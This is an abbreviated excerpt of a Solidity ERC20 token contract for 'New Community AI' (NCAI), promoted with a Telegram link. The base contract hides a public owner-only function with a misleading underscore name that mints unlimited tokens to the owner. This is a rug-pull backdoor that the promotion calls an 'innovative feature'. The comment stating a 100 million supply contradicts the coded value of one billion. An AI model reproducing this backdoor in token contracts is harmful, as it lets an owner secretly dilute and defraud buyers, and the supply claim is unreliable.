...
//
// $NewCommunityAI proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/NewCommunityAI
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _NewCommunityAI(uint256 amount) public onlyOwner {
 _NewCommunityAI(msg.sender, amount);
    }
    ...
    function _NewCommunityAI(address account, uint256 amount) internal virtual {
...
contract $NewCommunityAI is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("New Community AI", "NCAI") {
     _NewCommunityAI(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}